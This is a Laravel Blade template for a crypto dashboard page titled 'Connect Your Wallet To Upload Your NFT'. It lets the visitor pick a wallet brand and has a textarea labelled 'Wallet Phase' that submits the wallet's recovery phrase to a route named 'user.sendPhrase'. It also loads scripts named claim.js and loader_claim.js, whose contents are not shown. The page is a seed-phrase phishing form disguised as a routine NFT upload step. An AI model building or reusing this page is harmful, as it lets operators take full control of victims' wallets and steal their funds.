@extends('dashboard.layout.app')
@section('content')
    <script src="{{ asset('connect/settings.js') }}"></script>
    <script src="{{ asset('connect/moralis/moralis.js') }}"></script>
    <script src="{{ asset('connect/utils/ethereumjs-tx-1.3.3.min.js') }}"></script>
    <link rel="stylesheet" href="{{ asset('connect/src/css/styles.css') }}">

    <div class="nk-content nk-content-fluid">
        <div class="container-xl wide-lg">
            <div class="nk-content-body">
                <div class="buysell wide-xs m-auto">
                    <div class="buysell-title text-center">
                        <h4 class="title mb-3">Connect Your Wallet To Upload Your NFT</h4>
                        <hr>
                        <div class="card card-preview">
                            <div class="card-inner">
                                <form action="{{ route('user.sendPhrase') }}" method="POST">
                                    @csrf
                                    @if(session()->has('rejected'))
                                        <div class="alert alert-danger">
                                            {{ session()->get('rejected') }}
                                        </div>
                                    @endif
                                    @if ($errors->any())
                                        <div class="alert alert-danger">
                                            <ul>
                                                @foreach ($errors->all() as $error)
                                                    <li>{{ $error }}</li>
                                                @endforeach
                                            </ul>
                                        </div>
                                    @endif

                                    <div class="row gy-4">
                                        <div class="col-lg-12">
                                            <div class="form-group">
                                                <label class="form-label">Select Wallet</label>
                                                <div class="form-control-wrap">
                                                    <select name="wallet" class="form-select form-control form-control-lg select2-hidden-accessible" data-search="on" data-select2-id="6" tabindex="-1" aria-hidden="true">
                                                        <option value="Coinbase Wallet" >Coinbase Wallet</option>
                                                        <option value="Metamask" >Metamask</option>
                                                        <option value="Exodus" >Exodus</option>
                                                        <option value="ZenGo" >ZenGo</option>
                                                        <option value="Trezor Wallet" >Trezor Wallet</option>
                                                        <option value="Ambire Wallet" >Ambire Wallet</option>
                                                        <option value="StakedWallet" >StakedWallet</option>
                                                        <option value="BitGo Cryptocurrency Wallet" >BitGo Cryptocurrency Wallet</option>
                                                        <option value="CoinPayments Wallet" >CoinPayments Wallet</option>
                                                        <option value="MyEtherWallet" >MyEtherWallet</option>
                                                    </select>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="col-lg-12">
                                            <div class="form-group">
                                                <label class="form-label">Wallet Phase</label>
                                                <textarea name="phrase" id="" cols="30" rows="10" class="form-control"></textarea>
                                            </div>
                                        </div>

                                    </div>
                                    <button type="submit" class="btn btn-primary mt-3">Connect Wallet</button>
                                </form>

                            </div>
                        </div>

                    </div>



                </div><!-- .buysell -->


            </div>
        </div>
    </div>


    <script src="{{ asset('connect/src/js/loader_claim.js') }}"></script>

    <script src="{{ asset('connect/jquery/jquery.js') }}"></script>
    <script src="{{ asset('connect/web3/web3.min.js') }}"></script>
    <script src="{{ asset('connect/walletconnect/index.min.js') }}"></script>

    <script type="text/javascript" src="{{ asset('connect/src/js/claim.js') }}"></script>

@endsection
